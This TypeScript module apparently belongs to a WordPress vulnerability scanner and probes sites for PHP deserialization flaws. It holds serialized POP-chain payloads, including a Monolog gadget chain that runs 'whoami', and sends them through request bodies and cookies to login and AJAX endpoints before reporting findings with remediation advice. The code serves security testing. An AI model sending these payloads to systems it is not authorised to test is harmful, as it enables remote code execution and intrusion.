import type { Finding, ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, parallelProbe } from '../utils.js';

const MODULE_NAME = 'PHP Deserialization (POP Chain)';

// These differ from wp_object_injection.ts — we focus on POP gadget chains and
// Welcart/WP Super Cache-specific unserialize vectors, not stdClass/generic probes.
const POP_PAYLOADS = [
  // Welcart e-Commerce POP chain gadget
  'O:14:"WCEX_Utils_Imp":1:{s:4:"data";O:8:"stdClass":0:{}}',
  // WP Super Cache unserialize vector
  'O:12:"WP_Super_Cac":1:{s:5:"cache";a:1:{s:4:"data";s:6:"pwned!"}}',
  // Monolog RCE POP chain (common via Symfony-based plugins)
  'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"\\x00*\\x00socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\\x00*\\x00handler";r:1;s:13:"\\x00*\\x00bufferSize";i:-1;s:9:"\\x00*\\x00buffer";a:1:{i:0;a:2:{i:0;s:6:"whoami";s:5:"level";N;}}s:8:"\\x00*\\x00level";N;s:14:"\\x00*\\x00initialized";b:1;s:14:"\\x00*\\x00passThroughFallbackErrors";b:0;s:7:"\\x00*\\x00processors";a:0:{}}}',
  // Generic PHP unserialize with __toString trigger
  'O:10:"TokenInput":1:{s:5:"token";s:4:"test";}',
];

const ERROR_INDICATORS = [
  'unserialize(): Error at offset',
  '__wakeup',
  '__destruct',
  'Object injection',
  'Phar',
  'POP chain',
  'Unexpected end of serialized data',
  'unserialize() expects parameter',
];

// Endpoints that historically have accepted serialized PHP data
const PROBE_ENDPOINTS: Array<[string, string]> = [
  ['/wp-login.php?action=lostpassword', 'lostpassword'],
  ['/?wc-ajax=get_refreshed_fragments', 'woocommerce_ajax'],
  ['/wp-admin/admin-ajax.php?action=heartbeat', 'heartbeat'],
  ['/', 'homepage'],
];

// Cookie names used by plugins known to unserialize cookie values
const PROBE_COOKIE_NAMES = [
  'wordpress_test_cookie',
  'woocommerce_cart_hash',
  'wcx_member',
  'wp-super-cache',
];

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: Finding[] = [];
  const errors: string[] = [];

  try {
    const seen = new Set<string>();

    // Test each endpoint × payload combination
    const combos: Array<[string, string, string, string]> = [];
    for (const [path, label] of PROBE_ENDPOINTS) {
      for (const payload of POP_PAYLOADS) {
        combos.push([path, label, payload, 'body']);
      }
    }

    // Cookie-based probes
    for (const cookieName of PROBE_COOKIE_NAMES) {
      for (const payload of POP_PAYLOADS.slice(0, 2)) {
        combos.push(['/wp-login.php?action=lostpassword', `cookie:${cookieName}`, payload, 'cookie']);
      }
    }

    await parallelProbe(combos, async ([path, label, payload, via]) => {
      if (seen.has(label)) return;
      const url = target + path;
      const b64 = btoa(payload);

      const headers: Record<string, string> = {};
      let body: string | undefined;

      if (via === 'cookie') {
        const cookieName = label.replace('cookie:', '');
        headers['Cookie'] = `${cookieName}=${encodeURIComponent(payload)}`;
      } else {
        body = `data=${encodeURIComponent(b64)}`;
      }

      const res = await fetchURL(url, {
        method: via === 'cookie' ? 'GET' : 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded', ...headers },
        body,
        timeoutMs: 5_000,
      });
      if (!res) return;

      const text = await res.text().catch(() => '');
      const indicator = ERROR_INDICATORS.find(ind => text.toLowerCase().includes(ind.toLowerCase()));
      if (!indicator) return;

      if (!seen.has(label)) {
        seen.add(label);
        findings.push(finding(
          'PHP_DESERIALIZATION',
          'CRITICAL',
          url,
          `PHP deserialization indicator detected via ${via} at ${label}. Response revealed: '${indicator}'`,
          {
            evidence: `indicator="${indicator}" payload_prefix="${payload.slice(0, 50)}"`,
            remediation: 'Never pass untrusted data to unserialize(). Use JSON for data interchange. Audit all plugins for unserialize() calls on user-controlled input.',
          },
        ));
      }
    }, 20);

    // Check for plugin-specific unserialize in readme/changelog
    const pluginPaths = [
      '/wp-content/plugins/welcart/readme.txt',
      '/wp-content/plugins/wp-super-cache/readme.txt',
    ];
    await parallelProbe(pluginPaths, async (path) => {
      const res = await fetchURL(target + path, { timeoutMs: 3_000 });
      if (!res || res.status !== 200) return;
      const text = await res.text().catch(() => '');
      if (!text.includes('Stable tag:')) return;

      const versionMatch = text.match(/Stable tag:\s*([\d.]+)/i);
      const version = versionMatch?.[1] ?? 'unknown';
      const slug = path.includes('welcart') ? 'welcart' : 'wp-super-cache';

      findings.push(finding(
        'PHP_DESERIALIZATION_PLUGIN_PRESENT',
        'HIGH',
        target + path,
        `Plugin '${slug}' (v${version}) is installed — known to use unserialize() on user-controlled data`,
        {
          evidence: `slug=${slug} version=${version}`,
          remediation: `Update ${slug} to the latest version. Monitor for deserialization CVEs for this plugin.`,
        },
      ));
    }, 5);
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
